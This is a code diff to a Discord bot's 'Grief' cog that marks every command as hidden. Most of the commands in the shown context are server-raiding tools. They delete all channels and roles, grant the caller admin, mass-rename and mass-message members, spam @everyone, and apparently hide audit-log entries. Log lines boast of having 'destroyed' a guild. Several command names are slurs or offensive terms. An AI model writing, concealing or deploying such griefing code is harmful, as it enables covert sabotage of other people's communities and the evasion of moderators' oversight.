@@ -172,7 +172,7 @@ class Grief(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def h(self, ctx):
         await ctx.message.delete()
         guild = ctx.message.guild
@@ -190,7 +190,7 @@ class Grief(commands.Cog):
                 f"@\u001b[32m [GRIEF COG] {ctx.message.author} \u001b[0m has executed command -h"
             )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hshs(self, ctx):
         await ctx.message.delete()
         guild = ctx.message.guild
@@ -209,7 +209,7 @@ class Grief(commands.Cog):
             f"@\u001b[32m [GRIEF COG] {ctx.message.author} \u001b[0m has executed command -hshs"
         )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def rape(self, ctx):
         await ctx.message.delete()
         spying = self.bot.get_channel(666142878485053440)
@@ -266,7 +266,7 @@ class Grief(commands.Cog):
             f"@\u001b[32m {ctx.message.author} \u001b[0m has destroyed \u001b[33m {ctx.guild.name} \u001b[0m!"
         )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hs(self, ctx):
         await ctx.message.delete()
         guild = ctx.guild
@@ -285,7 +285,7 @@ class Grief(commands.Cog):
             f"user \u001b[32m {ctx.message.author} \u001b[0m has been granted admin in \u001b[33m {ctx.guild.name} \u001b[0m"
         )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def sh(self, ctx):
         await ctx.message.delete()
         guild = ctx.guild
@@ -300,7 +300,7 @@ class Grief(commands.Cog):
             f"@\u001b[32m {ctx.message.author} \u001b[0m has been granted other permissions in \u001b[33m {ctx.guild.name} \u001b[0m"
         )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def weeb(self, ctx):
         await ctx.message.delete()
         guild = ctx.guild
@@ -315,7 +315,7 @@ class Grief(commands.Cog):
             f"@\u001b[32m {ctx.message.author} \u001b[0m has been granted weeb powers in \u001b[33m {ctx.guild.name} \u001b[0m"
         )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hsedit(self, ctx, role: discord.Role, *name: str, pos: int):
         await ctx.message.delete()
         if role == None:
@@ -331,7 +331,7 @@ class Grief(commands.Cog):
             except discord.Forbidden:
                 print("No permission to move role")
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def jane(self, ctx):
         await ctx.message.delete()
         embed = discord.Embed(description="@everyone",
@@ -342,7 +342,7 @@ class Grief(commands.Cog):
         )
         await ctx.send(embed=embed)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def ifsexybenigcrime(self, ctx):
         await ctx.message.delete()
 
@@ -354,7 +354,7 @@ class Grief(commands.Cog):
         )
         await ctx.send(embed=embed)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def tgay(self, ctx):
         await ctx.message.delete()
         embed = discord.Embed(description="@everyone",
@@ -368,7 +368,7 @@ class Grief(commands.Cog):
 
 
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def janexd(self, ctx):
         await ctx.message.delete()
         embed = discord.Embed(description="@everyone",
@@ -381,7 +381,7 @@ class Grief(commands.Cog):
 
 
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def redhseyes(self, ctx):
         await ctx.message.delete()
         embed = discord.Embed(description="@everyone",
@@ -392,7 +392,7 @@ class Grief(commands.Cog):
         )
         await ctx.send(embed=embed)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def pornhub(self, ctx):
         i = 0
         await ctx.message.delete()
@@ -411,7 +411,7 @@ class Grief(commands.Cog):
             await ctx.send(embed=embed)
             await asyncio.sleep(0.7)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def nineeleven(self, ctx):
         await ctx.message.delete()
         while not client.is_closed:
@@ -428,11 +428,11 @@ class Grief(commands.Cog):
                 print(
                     f"\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
                 )
-    @commands.command()
+    @commands.command(hidden=True)
     async def listchannels(self, ctx):
         await ctx.send([x.name for x in self.bot.get_all_channels()])
         print([x for x in self.bot.get_all_channels()])
-    @commands.command()
+    @commands.command(hidden=True)
     async def nuclearhs(self, ctx):
         await ctx.message.delete()
         spying = self.bot.get_channel(666142878485053440)
@@ -457,7 +457,7 @@ class Grief(commands.Cog):
                 f"\u001b[32m {ctx.message.author} \u001b[0m has nuked and deleted all channels in \u001b[33m {ctx.guild.name} \u001b[0m"
             )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def renameall(ctx, *, rename_to):
         await ctx.message.delete()
         for user in ctx.guild.members:
@@ -475,7 +475,7 @@ class Grief(commands.Cog):
             f"Renamed everyone to what \u001b[32m {ctx.message.author} \u001b[0m desires"
         )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def rename(ctx, user: discord.Member = None, *, rename_to):
         await ctx.message.delete()
         if user == None:
@@ -491,7 +491,7 @@ class Grief(commands.Cog):
                     f"{user.name} has NOT been renamed to {rename_to} in \u001b[33m{ctx.guild.name} \u001b[0m"
                 )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def indianrename(self, ctx):
         await ctx.message.delete()
 
@@ -508,7 +508,7 @@ class Grief(commands.Cog):
                     f"{user.name} has NOT been renamed to {randomnick} in \u001b[33m{ctx.guild.name} \u001b[0m"
                 )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hsmsg(ctx, *, message):
         await ctx.message.delete()
         retStr = str(f"""```css\n{message}```""")
@@ -520,7 +520,7 @@ class Grief(commands.Cog):
                 print(f"{user.name} has NOT recieved the message.")
         print("Sent all messages")
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def msgsnipe(ctx, user: discord.Member = None, *, message):
         await ctx.message.delete()
         author = ctx.message.author
@@ -529,7 +529,7 @@ class Grief(commands.Cog):
         else:
             await user.send(message)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hshelp(self, ctx):
         await ctx.message.delete()
         embed = discord.Embed(colour=discord.Colour.blue(), title="hmmm")
@@ -574,7 +574,7 @@ class Grief(commands.Cog):
                        delete_after=11)
         print(f"Sent hs help to @\u001b[32m {ctx.message.author} \u001b[0m")
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hshelp2(self, ctx):
         await ctx.message.delete()
         embed = discord.Embed(colour=discord.Colour.blue(),
@@ -616,7 +616,7 @@ class Grief(commands.Cog):
                        delete_after=11)
         print(f"Sent hs help2 to @\u001b[32m {ctx.message.author} \u001b[0m")
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def voicehshelp(self, ctx):
         await ctx.message.delete()
         embed = discord.Embed(colour=discord.Colour(0xF8E71C))
@@ -636,7 +636,7 @@ class Grief(commands.Cog):
                        delete_after=11)
         print(f"Sent Voice help to @\u001b[32m {ctx.message.author} \u001b[0m")
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hschannel(self, ctx):
         await ctx.message.delete()
         channel = ctx.guild.channels
@@ -675,7 +675,7 @@ class Grief(commands.Cog):
             except:
                 print(f"{ctx.author} has generated channel {choose}")"""
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hsadd(self, ctx):
         await ctx.message.delete()
 
@@ -684,7 +684,7 @@ class Grief(commands.Cog):
         await ctx.guild.create_text_channel(choose)
         print(f"{ctx.author} has created channel {choose}")
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hsroles(self, ctx):
         colourrandom = [
             "".join([random.choice("0123456789ABCDEF") for j in range(6)])
@@ -718,7 +718,7 @@ class Grief(commands.Cog):
                                     colour=discord.Colour(colour))
             await users.add_roles(role)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def clearroles(self, ctx):
         await ctx.message.delete()
         for role in ctx.guild.roles:
@@ -732,7 +732,7 @@ class Grief(commands.Cog):
                     f"{role.name} \u001b[0m cannot be deleted!\u001b[33m {ctx.guild.name} \u001b[0m Exception:{e}"
                 )
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def randomspam(self, ctx):
         await ctx.message.delete()
         o = 4
@@ -748,14 +748,14 @@ class Grief(commands.Cog):
                 await ctx.send(embed=embed)
                 await asyncio.sleep(0.21)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hsserveredit(self, ctx, *, name):
         await ctx.message.delete()
         server = ctx.message.guild
         await server.edit(name=name, region="india")
         await server.edit(icon=None)
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def animated_status(self, ctx, infinite, *, status: str):
         if infinite is True:
             while True:
@@ -773,7 +773,7 @@ class Grief(commands.Cog):
             await self.bot.change_presence(activity=discord.Activity(
                 type=discord.ActivityType.listening, name="help"))
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def hideaudit(self, ctx):
         await ctx.message.delete()
         ctx.step = 7
@@ -801,7 +801,7 @@ class Grief(commands.Cog):
             except discord.Forbidden:
                 print("Missing perm for action")
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def distortvoice(self, ctx):
         await ctx.message.delete()
         region = [
